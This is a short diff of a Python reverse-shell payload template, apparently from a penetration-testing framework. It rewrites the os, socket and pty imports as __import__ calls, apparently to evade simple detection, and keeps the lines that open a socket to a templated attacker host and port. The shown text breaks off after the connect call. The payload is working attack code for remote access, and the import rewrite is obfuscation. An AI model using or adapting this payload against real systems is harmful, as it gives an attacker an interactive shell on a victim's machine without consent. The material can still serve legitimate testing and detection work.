@@ -1,6 +1,6 @@
-import os
-import socket
-import pty
+os = __import__("os")
+socket = __import__("socket")
+pty = __import__("pty")
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("{{datastore.lhost}}", {{datastore.lport}}))
